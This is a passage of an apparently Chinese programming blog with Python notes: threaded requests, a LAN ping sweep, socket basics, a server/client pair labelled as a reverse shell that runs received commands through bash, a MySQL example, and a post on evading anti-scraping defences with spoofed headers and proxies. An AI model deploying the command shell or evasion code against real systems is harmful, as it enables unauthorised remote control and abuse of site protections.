  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#同时开十个进程访问百度</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span><span class="params">()</span>:</span></span><br><span class="line">    time_start = time.time()</span><br><span class="line">    r = requests.get(url=<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">    times = time.time() - time_start</span><br><span class="line">    sys.stdout.write(<span class="string">"Status: %s---%s---%s\n"</span>%(r.status_codes, times, time.strftime(<span class="string">'%H:%M:%S'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    threads = []</span><br><span class="line">    threads_count = <span class="number">10</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        t = threading.Thread(target=fun1, args=())</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        threads[i].start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        threads[i].join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span>  Popen, PIPE</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoRun</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, queue)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self._queue = queue</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.empty():</span><br><span class="line">            ip = self._queue.get()</span><br><span class="line">            <span class="comment">#print ip</span></span><br><span class="line">            check_ping = Popen([<span class="string">'/bin/bash'</span>, <span class="string">'-c'</span>, <span class="string">'ping -c 2'</span>+ip], stdin=PIPE, stdout=<span class="keyword">None</span>)</span><br><span class="line">            data = check_ping.stdout.read()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'ttl'</span> <span class="keyword">in</span> data:</span><br><span class="line">                sys.stdout.write(ip+<span class="string">' is UP\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    threads=[]</span><br><span class="line">    threads_count = <span class="number">10</span></span><br><span class="line">    queue = Queue.Queue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">        queue.put(<span class="string">"192.168.43."</span>+str(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range (threads_count):</span><br><span class="line">        threads.append(DoRun(queue))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<h2 id="Python网络编程"><a href="#Python网络编程" class="headerlink" title="Python网络编程"></a>Python网络编程</h2></blockquote>
<ul>
<li><h4 id="C-S架构"><a href="#C-S架构" class="headerlink" title="C/S架构"></a>C/S架构</h4><ul>
<li>客户机和服务器架构，Server的唯一目的是等待Client的请求，Client链接上Server后，发送数据并由Server处理，然后Server将处理后的数据交给Client</li>
</ul>
</li>
<li><h4 id="C-S网络编程"><a href="#C-S网络编程" class="headerlink" title="C/S网络编程"></a>C/S网络编程</h4></li>
<li><h4 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h4><ul>
<li>类似于通信端点的概念的网络数据结构</li>
</ul>
</li>
<li><h4 id="Socket模块"><a href="#Socket模块" class="headerlink" title="Socket模块"></a>Socket模块</h4><ul>
<li><p>该模块的socket()方法用来创建套接字<code>socket(socket_family,socket_type,protocol=0)</code></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">For example:(create a tcp socket)</span><br><span class="line">tcpsock = socket(socket.AF_INET,socket.SOCK_STREAM)</span><br></pre></td></tr></table></figure>
<p>  |服务端套接字函数|功能|<br>  |———|——–|<br>  | s.bind()  | 绑定地址到套接字  |<br>  |s.listen()   | 开始监听TCP端口  |<br>  | s.accept()  | 被动接受TCP客户端连接，（阻塞式）等待连接的到来  |</p>
<p>  |客户端套接字函数|功能|<br>  |————|—————|<br>  |  s.connect()   | 主动初始化TCP服务连接   |<br>  |  s.connect_ex() | connect()函数的扩展版本，出错时返回错误代码，而不是返回异常  |</p>
<p>  |公共用途套接字函数|功能|<br>  |——————-|————-|<br>  |  s.recv() | 接受TCP数据  |<br>  |  s.send() | 发送TCP数据  |<br>  | s.sendall()  | 完整发送TCP数据  |<br>  | s.recvfrom()  | 接受UDP数据  |<br>  | s.sendto()  | 发送TCP数据  |<br>  | s.getpeemame()  | 接收到当前套接字的远端地址  |<br>  | s.getsockname()  | 当前套接字的地址  |<br>  | s.getsockopt()  |  返回指定套接字的参数 |<br>  | s.setsockopt()  | 这只指定套接字的参数  |<br>  | s.close()  | 关闭当前套接字  |</p>
</li>
<li><p>简单的python服务器与客户端脚本，反弹shell</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Server服务端</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#！/usr/bin/env  python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">''</span></span><br><span class="line">PORT = <span class="number">5567</span></span><br><span class="line">BUFFER = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line"></span><br><span class="line">tcpServer = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpServer.bind(ADDR)</span><br><span class="line">tcpServer.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"waiting for connection..."</span></span><br><span class="line">    tcpClient,addr = tcpServer.accept()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"..Connected from : "</span>,addr</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data = tcpClient.recv(BUFFER)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        cmd = Popen([<span class="string">'/bin/bash'</span>,<span class="string">'-c'</span>,data],stdin=PIPE,stdout=PIPE)</span><br><span class="line">        data = cmd.stdout.read()</span><br><span class="line">        tcpClient.send(<span class="string">'[%s] : %s'</span>%(ctime(), data))</span><br><span class="line"></span><br><span class="line">tcpClient.close()</span><br><span class="line">tcpServer.colse()</span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Client客户端</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'192.168.43.23'</span>  <span class="comment">#根据要访问的服务器IP而定</span></span><br><span class="line">PORT = <span class="number">5567</span></span><br><span class="line">BUFFER = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line"></span><br><span class="line">tcpClient = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpClient.connect(ADDR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    data = raw_input(<span class="string">'~: '</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    tcpClient.send(data)</span><br><span class="line">    data = tcpClient.recv(BUFFER)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">tcpClient.close()</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<blockquote>
<h2 id="Python数据库编程"><a href="#Python数据库编程" class="headerlink" title="Python数据库编程"></a>Python数据库编程</h2></blockquote>
<ul>
<li>Python DB API<ul>
<li>数据通道（数据库连接对象connection）</li>
<li>数据（数据库交互对象cursor）</li>
<li>异常（数据库异常类exceptions）</li>
<li>访问流程：<ul>
<li>创建connection连接，获取cursor，执行操作，关闭cursor，关闭connection</li>
</ul>
</li>
</ul>
</li>
<li>Python MySQL开发环境<ul>
<li>python代码  ——-&gt;  MySQL for Python  ——-&gt;   数据库服务器</li>
</ul>
</li>
<li><p>Python数据库编程实例</p>
<ul>
<li>数据库连接对象connection</li>
<li>链接对象：建立Python客户端与数据库的网络连接</li>
<li><p>创建方法：MySQLdb.Connect(参数)</p>
<pre><code>|  参数名  |  类型  |  说明 |
|---------|------|------|
|  host   |   字符串  |  MySQL服务器地址   |
|  port   |   数字  |  MySQL服务器端口号   |
|  user   |  字符串   |  用户名   |
|  passwd   |   字符串  | 密码    |
|  db   |   字符串  |  数据库名   |
|  charset   |   字符串  | 连接编码  |
</code></pre></li>
<li><p>connection对象支持方法</p>
<pre><code>|  方法名 | 说明  |
|--------|-----|
|  cursor() | 使用该连接创建并返回游标  |
|  commit()   |提交当前事务    |
|  rollback()   | 回滚当前事务    |
|  close()   |  关闭当前事务   |
</code></pre></li>
<li><p>cursor对象支持的方法</p>
<pre><code>|   参数名  |  说明   |
|---------|----------|
|  execute(op[,args])   |  执行一个数据库查询命令   |
|  fetchone()   |  取得结果集里的下一行   |
|  fetchmanv(size)   |  取得结果集里的下几行   |
|  fetchall()   |  取得结果集里的下几行   |
|  rowcount()   |  最近一次execute返回的数据的函数或影响行数   |
|  close()   |  关闭   |
</code></pre>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#简单的数据库编程实例</span></span><br><span class="line"><span class="comment">#！/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line"></span><br><span class="line">conn = MySQLdb.connect(host = <span class="string">'192.168.43.100'</span>, port = <span class="number">3360</span>, user = <span class="string">'root'</span>, passwd = <span class="string">'123#@!'</span>)</span><br><span class="line"></span><br><span class="line">cus = conn.cursor()</span><br><span class="line"></span><br><span class="line">sql = <span class="string">'select version()'</span></span><br><span class="line"></span><br><span class="line">cus.execute(sql)</span><br><span class="line"><span class="keyword">print</span> cus.fetchone()</span><br><span class="line"></span><br><span class="line">cus.close()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
<p>  另一个实例结合的是web编程的爬虫所展开</p>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>

    

    
    
    
    <div>
      
    </div>
    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Python-Web编程之反爬机制绕过/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Healer">
      <meta itemprop="description" content="桃李不言，下自成蹊">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JD1412">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/14/Python-Web编程之反爬机制绕过/" class="post-title-link" itemprop="url">Python Web编程之反爬机制绕过</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-01-14 06:12:59 / 修改时间：06:13:40" itemprop="dateCreated datePublished" datetime="2019-01-14T06:12:59+08:00">2019-01-14</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/programming/" itemprop="url" rel="index"><span itemprop="name">编程</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<h1 id="python-web编程之反爬机制绕过"><a href="#python-web编程之反爬机制绕过" class="headerlink" title="python web编程之反爬机制绕过"></a>python web编程之反爬机制绕过</h1></blockquote>
<h2 id="从一道逆向题引发的思考："><a href="#从一道逆向题引发的思考：" class="headerlink" title="从一道逆向题引发的思考："></a>从一道逆向题引发的思考：</h2><ul>
<li>能否直接将要解密的数据，通过python脚本的的方式，提交给相应的网站，并通过脚本抓取相应的结果</li>
<li><p>现在的网站都添加了相应的反爬取机制，刚开始的几次是可以成功的，但是之后脚本就无法接收到数据了，发现网站上多了一个输入验证码的环节</p>
</li>
<li><h2 id="具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本"><a href="#具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本" class="headerlink" title="具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本"></a><strong>具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本</strong></h2></li>
<li><h2 id="具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本-1"><a href="#具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本-1" class="headerlink" title="具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本"></a><strong>具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本</strong></h2></li>
<li><h2 id="具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本-2"><a href="#具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本-2" class="headerlink" title="具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本"></a><strong>具体情况要根据访问的网站限制机制来写脚本，不能单纯的使用现成的脚本</strong></h2></li>
<li><h2 id="查询的一些基础资料："><a href="#查询的一些基础资料：" class="headerlink" title="查询的一些基础资料："></a>查询的一些基础资料：</h2><ul>
<li><a href="https://www.cnblogs.com/heikeboke/p/8012041.html" target="_blank" rel="noopener">https://www.cnblogs.com/heikeboke/p/8012041.html</a></li>
<li><a href="http://www.jb51.net/article/95728.htm" target="_blank" rel="noopener">http://www.jb51.net/article/95728.htm</a></li>
<li><a href="https://www.cnblogs.com/yoyoketang/p/6838596.html" target="_blank" rel="noopener">https://www.cnblogs.com/yoyoketang/p/6838596.html</a></li>
</ul>
</li>
<li><h2 id="反爬取方式及解决思路："><a href="#反爬取方式及解决思路：" class="headerlink" title="反爬取方式及解决思路："></a>反爬取方式及解决思路：</h2><ul>
<li><h3 id="从用户请求的Headers反爬虫"><a href="#从用户请求的Headers反爬虫" class="headerlink" title="从用户请求的Headers反爬虫"></a>从用户请求的Headers反爬虫</h3><ul>
<li><h4 id="伪装header"><a href="#伪装header" class="headerlink" title="伪装header"></a>伪装header</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mechanize库中的用法</span></span><br><span class="line">br.addheaders = [(<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.7 Safari/537.36'</span>)]</span><br><span class="line"><span class="comment">#常见的添加定制的 headers（示例如下）</span></span><br><span class="line">headers =&#123;</span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"www.cmd5.com"</span>,</span><br><span class="line">    <span class="string">"Content-Length"</span>: <span class="string">"1832"</span>,</span><br><span class="line">    <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>,</span><br><span class="line">    <span class="string">"Origin"</span>: <span class="string">"http://www.cmd5.com"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.7 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Referer"</span>: <span class="string">"http://www.cmd5.com/"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9,en;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Cookie"</span>: <span class="string">"FirstVisit=2017/10/14 16:49:39; ASP.NET_SessionId=4240erfxxgel3450n4dgddej; comefrom=https://www.baidu.com/link?url=_iyok742ki838ontfqnni8s-yikrus241ocxk3cplqo&amp;wd=&amp;eqid=ed2c528f0003fd1a000000055b18de2e; Hm_lvt_0b7ba6c81309fff7ce4498ec7b107c0b=1528302253,1528328811,1528356400; Hm_lpvt_0b7ba6c81309fff7ce4498ec7b107c0b=1528356400"</span>,</span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"close"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><h3 id="基于用户行为反爬虫（同一IP短时间内多次访问同一页面，或者同一账户短时间内多次进行相同操作）"><a href="#基于用户行为反爬虫（同一IP短时间内多次访问同一页面，或者同一账户短时间内多次进行相同操作）" class="headerlink" title="基于用户行为反爬虫（同一IP短时间内多次访问同一页面，或者同一账户短时间内多次进行相同操作）"></a>基于用户行为反爬虫（同一IP短时间内多次访问同一页面，或者同一账户短时间内多次进行相同操作）</h3><ul>
<li><h4 id="IP代理"><a href="#IP代理" class="headerlink" title="IP代理"></a>IP代理</h4><ul>
<li><a href="https://www.cnblogs.com/eric8899/p/6122759.html" target="_blank" rel="noopener">https://www.cnblogs.com/eric8899/p/6122759.html</a></li>
<li><a href="https://www.cnblogs.com/hearzeus/p/5157016.html" target="_blank" rel="noopener">https://www.cnblogs.com/hearzeus/p/5157016.html</a></li>
<li><a href="https://www.jianshu.com/p/2577e5bcbf05" target="_blank" rel="noopener">https://www.jianshu.com/p/2577e5bcbf05</a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用request库加代理参数的方法</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">proxy = &#123;<span class="string">'HTTPS'</span>: <span class="string">'117.85.105.170:808'</span>,<span class="string">'HTTP'</span>:<span class="string">'117.85.105.170:808'</span>&#125;</span><br><span class="line">head = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>&#125;</span><br><span class="line">p = requests.get(<span class="string">'http://icanhazip.com'</span>, headers=head, proxies=proxy)</span><br><span class="line">print(p.text)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取代理IP列表的简单尝试</span></span><br><span class="line"><span class="comment">#encoding=utf8</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">User_Agent = <span class="string">'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0'</span></span><br><span class="line">header = &#123;&#125;</span><br><span class="line">header[<span class="string">'User-Agent'</span>] = User_Agent</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.xicidaili.com/nn/1'</span></span><br><span class="line">req = urllib2.Request(url,headers=header)</span><br><span class="line">res = urllib2.urlopen(req).read()</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup.BeautifulSoup(res)</span><br><span class="line">ips = soup.findAll(<span class="string">'tr'</span>)</span><br><span class="line">f = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,len(ips)):</span><br><span class="line">    ip = ips[x]</span><br><span class="line">    tds = ip.findAll(<span class="string">"td"</span>)</span><br><span class="line">    ip_temp = tds[<span class="number">1</span>].contents[<span class="number">0</span>]+<span class="string">"\t"</span>+tds[<span class="number">2</span>].contents[<span class="number">0</span>]+<span class="string">"\n"</span></span><br><span class="line">    <span class="comment"># print tds[2].contents[0]+"\t"+tds[3].contents[0]</span></span><br><span class="line">    f.append(ip_temp)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span 